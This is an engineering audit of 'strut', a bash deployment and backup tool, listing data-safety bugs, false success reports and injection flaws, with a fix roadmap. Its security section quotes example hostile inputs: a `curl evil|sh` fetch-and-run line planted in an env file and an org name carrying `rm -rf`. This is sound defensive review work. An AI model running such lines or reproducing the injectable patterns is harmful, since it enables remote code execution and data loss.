# strut — Full-Codebase Audit & Roadmap Refresh (2026-07-03)

Audit of strut @ v0.29.1 (~33k LoC bash, 1,625 BATS tests passing). Seven parallel
deep-reads across every subsystem, cross-referenced against open issues #173–#188.
The test suite is green — every finding below lives in a path the suite does **not**
exercise (remote SSH execution, restore/rollback flows, failure-mode handling,
cron/alert delivery). That gap is itself the headline.

---

## TL;DR

strut's **breadth is excellent** — deploy, blue-green, backup/restore across 4 DB
engines, drift, secrets, keys, migrate, gateway, fleet, monitoring. But several
**load-bearing safety features are non-functional**, and a number of **shipped commands
silently lie about success**. The forward-looking roadmap (env layering #173–#179,
multi-host #187/#188) is building on primitives that are currently broken. Recommend a
**reliability-hardening milestone before new feature epics**.

### The 12 must-fix (P0)

| # | Subsystem | Defect | Blast radius |
|---|-----------|--------|--------------|
| P0-1 | rollback | Snapshots capture the mutable compose **tag**, then `docker pull` + `up -d` re-fetch the *current* image → rollback re-deploys the bad version and reports success | Rollback is a destructive no-op for any stack using `:latest`-style tags (the common case) |
| P0-2 | deploy | Image pull failure is `warn`-only, but deploy still `down`s the stack → recreates from stale cache (silent old-code deploy) or fails after teardown (full outage), banner says ✓ | Every deploy on an expired-PAT / registry-down host |
| P0-3 | blue-green | Health gate probes `localhost:$port` (answered by the *old* color) and discards container-check results (pipeline subshell + NDJSON parse fail) → a dead green passes and takes traffic | Blue-green's entire safety premise |
| P0-4 | backup/restore | Restores drop/`rm -rf` **before** validating the dump; no `ON_ERROR_STOP` on any restore `psql` → partial restore reported "complete" over a now-destroyed DB | Data loss on every corrupt-dump restore |
| P0-5 | db:pull | Helper's `log`/`ok` lines (stdout) are captured as the file path → `db:pull` restore is broken for every engine; once fixed, `db:pull sqlite` restores to **prod** (VPS_HOST leaks from sourced env) | `db:pull` unusable / wrong-direction |
| P0-6 | backup verify | Verification passes on truncated/empty/garbage dumps (no content assertion; Neo4j "verify" is a 100-byte size check) | False confidence in every backup |
| P0-7 | init | `strut init` overwrites an existing `.gitignore` wholesale — destroying the tool's own primary defense against `git clean -fd` data loss | Anyone running init in an existing repo |
| P0-8 | scaffold/recipes | Recipe scaffolds ship **no** `.gitignore` and bind-mount data (`./media`, `./immich-library`, …) *inside* the checkout → next `git clean` deletes it | Every recipe-based stack |
| P0-9 | CLI dispatch | `--host` is consumed by `parse_common_flags` before handlers run → `gateway`/`provision`/`cert:*` host-scoped commands are **unreachable or mis-routed** | Entire host-command family |
| P0-10 | migrate | `migrate.sh` redefines `confirm()` with no guard, honoring `MIGRATE_AUTO_YES` not `STRUT_YES` → `--yes`/`-y` silently stops working across the **whole CLI** once migrate.sh is sourced | CI automation everywhere |
| P0-11 | keys | `ssh:revoke <user>` does `grep -v "$user"` as a **substring over the whole line** → revoking user "ed" strips every `ssh-ed25519` key = total SSH lockout; username also breaks single-quote to inject remote shell | Host lockout / RCE |
| P0-12 | drift | `drift fix` is a **no-op** (loop only syntax-checks `git_file`==`vps_file`, never syncs) yet prints "fixed successfully" and writes `resolution: success` to the audit trail | Silent drift + false audit history |

## Cross-cutting themes

These recur across subsystems and are the real story — most P0/P1 items are instances.

### T1 — "Reports success on failure" is systemic
The dominant failure mode. Non-exhaustive: rollback (P0-1), stale-image deploy (P0-2),
blue-green health gate (P0-3), restore over destroyed DB (P0-4), backup verify (P0-6),
drift fix (P0-12), `keys test:ssh` always-0 (pipeline subshell), anonymization reports
complete when every UPDATE errored (+ SQLite "hash" is reversible `HEX()`),
`compare_postgres` compares a catalog count (~1) so DBs always "match", monitoring
declares Grafana ready on a 502, alert-channel test can never fail. Root causes:
`cmd | while …` subshells losing state, missing `-f`/`ON_ERROR_STOP`/`pipefail`
through SSH, and the `a && ok || warn` idiom flattening distinct failures.

### T2 — Shipped features that never actually run
`backup`/`drift`/`retention` **cron jobs** use bare `strut` (not on cron's PATH) and
log into dirs that may not exist → they never fire. **Alerts** (backup + drift + notify
slack/discord) build multiline JSON with literal newlines → every webhook 4xx's, hidden
by `curl -s …>/dev/null`; `alert_backup_failure`/`alert_verification_failure` have **zero
call sites** anyway. Net: backups can quietly stop and nothing pages anyone.

### T3 — Wrong-host / wrong-target operations
`SSH_KEY`/`SSH_PORT` (set only by `audit`) vs `VPS_SSH_KEY`/`VPS_PORT` (everything else):
the divergence check, volguard, and remote lock connect to port 22 with default keys and
**silently skip** on hardened hosts. Raw `set -a; source env` after `validate_env_file`
clobbers dispatcher-resolved `VPS_HOST`/`--host`/topology → `stop --host standby` stops
prod. `rollback`/`db:pull sqlite` ignore `--env` / restore to the wrong side.

### T4 — Destructive-op ordering & missing dry-run honor
Destroy-before-verify: restores (`rm -rf`/`DROP` before dump validation), migrate cutover
(stops old stack before the new one is deployed/verified), gateway (installs Caddyfile
before `caddy validate`). Dry-run violations: `--dry-run` deploy runs the `pre_deploy`
hook + validation before the plan-only exit; `keys db:rotate/ssh:rotate --dry-run` and
`volumes init --dry-run` perform **real** mutations.

### T5 — Injection & secret exposure (the #163/#164/#175 quoting class, still live)
`eval echo "\${${var}:-}"` over `required_vars` (repo-synced file → RCE on deploy);
`init --org 'a;rm -rf'` written unquoted into sourced strut.conf; `sed "s|…|$value|"`
corrupts on `| & \`; PAT embedded in remote git command lines (visible in `ps`);
`StrictHostKeyChecking=no` on every secret transfer; env files `source`d = a compromised
VPS can plant `X=$(curl evil|sh)` that runs on the operator's laptop on next `secrets pull`.

### T6 — Six inspection tools, five comparison engines, no shared core
`drift` (sha256-of-echo, local-only), `diff` (normalized KV over SSH), `doctor`
(working-dir labels over SSH), `validate` (source+printenv), `posture` (grep `.env`),
`status-all` (local docker + a metrics file nothing writes). They disagree by
construction: drift says CLEAN while diff shows pending; validate fails a var posture
passes; doctor's two adjacent deploy-dir probes contradict each other. `diff.sh` is the
only pure, tested, SSH-thin one — the others should collapse onto it.

### T7 — Massive per-engine / per-path copy-paste
The postgres/neo4j/mysql/sqlite quadruple is duplicated ~7× (list/verify/retention/
health/metrics/dashboard/missed-check); `deploy_stack` vs `bg_deploy_stack` share a
copy-pasted preamble (so every fix lands twice); the `user@host:port key` spec is
hand-parsed in **six** places; two divergent secrets subsystems (`secrets *` vs
`keys env:*`) with opposite leak policies. Adding a DB engine touches ~10 files.

### T8 — Config-driven principle leaks (and the test that should catch it doesn't)
Hardcoded app-specifics survive because `test_no_hardcodes.bats` greps only the literal
"Climate-Hub" / a few `ch-*` strings in `health.sh`: `gdrive`/`gdrive-transcripts`/
`ch-ingest-gdrive` (backup), `neo4j:5.15-community`, `twenty`/`vps-2` (monitor),
`ch_deploy_*` metrics, `SEMANTIC_API_KEYS` (keys), `postgres`/`app_db` (schema),
`STACK_DATA_DIRS="data/postgres …"` (deploy).

### T9 — macOS / bash-version portability (the #134 class)
`free` (health), `timeout` (doctor, keys) → wrong "unreachable" verdicts on stock macOS;
`mapfile` in completions and `unset arr[-1]` (bash 4.3) break on macOS bash 3.2 / CentOS 7
4.2; `date -d` assumed in cert/backup.

## Roadmap assessment

**Open issues today** (#173–#188) cluster into two forward-looking epics: **env
layering** (#173 per-host overrides, #176 shared env, #178 SOPS/age, #179 design) and
**multi-host/fleet** (#187 staleness, #188 first-class multi-host, #185 adopt), plus
deploy-safety #186 and drift-reliability #182.

**What the audit changes:**

1. **#182 (drift) is bigger than a bug — drift's core is non-functional.** All 5 sub-bugs
   root-caused (see §Issue-182). On top of them, `drift fix` does nothing (P0-12), alerts
   never deliver, and the cron never runs. Recommendation: **don't patch drift in place —
   re-point it at the `diff.sh` engine** (T6). diff already does correct remote
   comparison; drift owns history+alerting+cron. Merging is less work than fixing.

2. **#187/#188 (multi-host) rest on broken primitives.** `fleet_sync` — the recommended
   staleness remediation — is broken without a PAT on exactly the deploy-key hosts the
   migrate wizard sets up (unconditional `insteadOf` rewrite). The host-spec parser is
   forked 6×, there's no per-host `deploy_dir` (so non-`ubuntu` hosts can't sync), and
   `--host` doesn't even reach handlers (P0-9). **Land the shared host-spec resolver +
   connection primitive first**, then #188 becomes small.

3. **#186 (deploy safety) is under-scoped.** It asks for `--backup-first`, dry-run git
   clean, health-gated auto-rollback. But rollback itself doesn't work (P0-1), the health
   gate measures the wrong thing (P0-3), and `--force-clean` *destroys* rollback state.
   Fix those first or the safety net is decorative.

4. **#173–#179 (env layering) should absorb the connection-resolution refactor.** The
   `resolve_connection <stack> <env>` primitive that env layering needs is the same one
   that fixes T3 (wrong-host ops) and the ~8× copy-paste in secrets.

**Proposed milestone ordering:**

- **M1 — Data-safety & trust (P0):** the 12 above. Non-negotiable; these are silent data
  loss + silent success.
- **M2 — Make shipped features real (P1):** crons, alerts, drift-fix/merge, wrong-host
  guards, broken key-rotation commands, config-load robustness, portability sweep.
- **M3 — Foundational refactors (P2):** shared inspection engine (T6), backup engine
  registry (T7), host-spec resolver + connection primitive (unblocks #187/#188/#173),
  deploy preamble extraction, no-hardcodes test hardening.
- **M4 — Then the feature epics:** #178 SOPS, #188 multi-host, #185 adopt, new recipes,
  restore-rehearsal, image-digest drift, running-vs-repo inventory.

## Issue-182 root causes (for the drift rewrite)

1. **False-pos phantom newline** — `drift.sh:56-65`: `git show` strips trailing newlines,
   `echo "$x" | sha256sum` re-adds one → any file not ending in exactly one `\n` drifts
   forever. Fix: `git show HEAD:path | sha256sum` directly / `git hash-object` both sides.
2. **False-neg wrong location** — `drift.sh:235-236` (and 415/560/781): `git_file` and
   `vps_file` are the **same local path**; drift never SSHes. A host running from a
   different deploy dir is invisible.
3. **Config-only crash** — `monitor.sh:13` source-time `cd …/stacks/monitoring` aborts the
   CLI for any project without a monitoring stack (and shadows a stack named `monitoring`).
4. **Env-blind** — tracked set excludes `.env`/`.<env>.env`; the `env` param is only a JSON
   label. `diff.sh` already has `diff_env_content` to reuse.
5. **Untracked-blind** — `[ -f "$git_file" ] || continue` skips deleted files; non-git
   files "use current hash" so new files never drift; fixed 6-file allowlist + no
   `docker ps`-vs-`stacks/*` inventory means whole rogue stacks are out of scope.

### M1 — Data-safety & trust (P0)

**[P0] rollback: snapshots capture mutable tags, so `rollback` re-deploys the current (bad) image**
`bug, deploy, data-safety`
Problem: `rollback_snapshot` records `docker compose ps` **tags** (`rollback.sh:64`), and
restore does `docker pull "$image"` + `up -d` (`rollback.sh:128-144`) — for a `:latest`
tag this fetches the just-pushed bad image; `up -d` resolves from compose tags regardless.
Fix: snapshot `docker inspect` **image IDs/digests**; restore via `docker tag <digest>
<tag>` or a compose image override so the recorded image actually runs. Add post-restore
health check. Acceptance: BATS/integration test that deploys img A, deploys img B, rolls
back, asserts the running container digest == A.

**[P0] deploy: pull failure tears down the stack and reports success (stale-code deploy / outage)**
`bug, deploy, data-safety`
Problem: registry login + `pull --ignore-pull-failures` are `warn`-only (`registry.sh:55`,
`docker.sh:32`), then `deploy.sh:226` `down` + `:247` `up -d` runs from stale cache (silent
old code) or fails after teardown (outage), banner still ✓. Blue-green swallows all pull
errors (`deploy_blue_green.sh:135`). Fix: assert pulls produced the expected images before
`down`; abort (don't teardown) on pull failure unless `--build`; wire `DOCKER_SUDO_PREFIX`
into `registry_login` (P0 for sudo hosts). Acceptance: deploy with an unreachable registry
fails loudly and leaves the running stack untouched.

**[P0] blue-green: health gate tests the wrong color and discards container results**
`bug, deploy, blue-green, data-safety`
Problem: three defects in `health.sh` — container check runs in a pipeline subshell so
`HEALTH_FAILED` is lost (`:103-114`); `ps --format json` assumes an array but compose
≥2.21 emits NDJSON (`:97`); app probes hit `localhost:$port` answered by the still-live old
color (`:170-184`). A dead green passes → proxy swaps → outage. Fix: scope probes to the
green project (exec-into-container or published green port), consume container JSON without
a subshell, handle NDJSON. Acceptance: integration test where green crash-loops → gate
fails → proxy stays on blue.

**[P0] restore: `psql`/restore paths destroy data before validating the dump and report success on partial failure**
`bug, backup, data-safety`
Problem: `restore_postgres` (`backup.sh:497`) DROPs then restores with no `ON_ERROR_STOP`
→ exit 0 on partial restore over a destroyed DB; remote push-restore (`backup.sh:784`)
merges without drop; Neo4j restore `rm -rf`s the volume before checking the archive
(`backup.sh:424`) and its error handler is `set -e`-dead code. Fix: add
`-v ON_ERROR_STOP=1` to **all** restore/verify psql; validate archive (`tar -tzf` /
non-empty / `pg_restore --list`) before any destructive step; take a pre-restore safety
snapshot; stop app writers during restore. Acceptance: restoring a truncated dump fails
loudly and leaves the original DB intact.

**[P0] db:pull: helper log lines are captured as the download path → restore broken for every engine; sqlite restores to prod**
`bug, backup, data-safety`
Problem: `_db_pull_find_and_download` emits `log`/`ok` to **stdout** then `echo "$path"`
(`backup.sh:555-562`); callers capture all of it, so `[ -f "$sql_file" ]` always fails.
Separately, `db_pull` sources the remote env (sets `VPS_HOST`), so `restore_sqlite`
branches remote and overwrites **production** despite "overwrite your local DB". Fix: send
helper logs to stderr; force local target for the pull-restore direction. Acceptance:
`db:pull` restores into the local stack; a mocked round-trip test guards the capture bug.

**[P0] backup verify: passes on corrupt/empty/garbage dumps**
`bug, backup`
Problem: Postgres verify restores with errors suppressed and only checks `table_count>0`
(`verify.sh:71`); Neo4j "verify" is `file_size<100` (`verify.sh:113`); full Neo4j verify
uses Enterprise-only `database load/DROP` against Community → always falls back to 0/success.
Fix: content assertions per engine (row counts on known tables, `pg_restore --list` parse,
`PRAGMA integrity_check` for sqlite, `neo4j-admin` against a scratch dir with real dir
layout). Acceptance: a deliberately truncated dump fails verification.

**[P0] init: `strut init` overwrites an existing `.gitignore`**
`bug, cli, data-safety`
Problem: `cmd_init.sh:84` `cat > .gitignore` unconditionally — destroying the tool's own
`git clean` defense. Fix: if present, append missing rules idempotently (marker block) and
back up; never truncate. Acceptance: init in a repo with a populated `.gitignore` preserves
existing rules and adds strut's.

**[P0] recipes: scaffolds ship no `.gitignore` and bind-mount data inside the checkout**
`bug, scaffold, data-safety`
Problem: recipe branch (`cmd_scaffold.sh:80-108`) copies no gitignore; jellyfin/immich/
paperless/audiobookshelf default mounts land in the checkout → `git clean -fd` on deploy
deletes user data. Fix: every scaffold path emits `.gitignore`; recipe data dirs default
outside the checkout (or are ignored) and print the DATA-SAFETY warning. Acceptance: a
scaffolded recipe has `.gitignore` covering its data dirs; `git clean -nd` lists nothing.

**[P0] cli: `--host` is eaten by `parse_common_flags` → gateway/provision/cert unreachable**
`bug, cli, multi-host`
Problem: `flags.sh:44-45` consume `--host` globally; `cmd_gateway.sh:147` then fails
"Usage: … --host". `strut <host> provision|cert:*` also die at stack validation
(`strut:744`). Verified empirically. Fix: give host-scoped commands a real entrypoint
grammar (`topology_is_host_alias` already exists) and let handlers read `FLAGS_HOST`.
Acceptance: `strut gateway deploy --host harbor` and `strut harbor provision` dispatch
correctly; add dispatch tests (current unit tests bypass the entrypoint).

**[P0] migrate: unguarded `confirm()` redefinition breaks `--yes`/`STRUT_YES` CLI-wide**
`bug, migrate, ci`
Problem: `migrate.sh:34` redefines `confirm()` (honoring `MIGRATE_AUTO_YES`, not
`STRUT_YES`) with no `declare -f` guard, once sourced it shadows the safe one everywhere.
Fix: guard like `audit.sh:13`, or namespace as `migrate_confirm`. Acceptance: with
migrate.sh sourced, `STRUT_YES=1 confirm x` still auto-approves.

**[P0] keys: `ssh:revoke <user>` substring-matches the whole line → can wipe every key**
`bug, keys, security, data-safety`
Problem: `keys/ssh.sh:317` `grep -v "$username" authorized_keys` matches the base64 blob /
`ssh-ed25519` prefix — revoking "ed" removes all ed25519 keys (lockout); `$username` in a
single-quoted remote script also allows quote-break injection. Fix: match the key
**comment** field exactly (`awk '$NF != user'`), pass the username safely (printf-quoted /
stdin). Acceptance: revoking user "ed" removes only that key; a username with `'` is inert.

**[P0] drift: `drift fix` is a no-op that reports success and writes false "resolved" history**
`bug, drift`
Problem: `drift.sh:466-483` loop sets `git_file==vps_file` and only syntax-checks; never
syncs anything, then prints "fixed successfully" + records `resolution: success` +
`alert_drift_fixed`. Fix: implement real remediation (`git checkout -- <file>` and/or push
to the resolved deploy location over SSH) or remove `fix` until real. Best resolved by the
drift→diff-engine merge (see #182 rewrite). Acceptance: after `fix`, a re-`detect` shows no
drift because the file was actually restored.
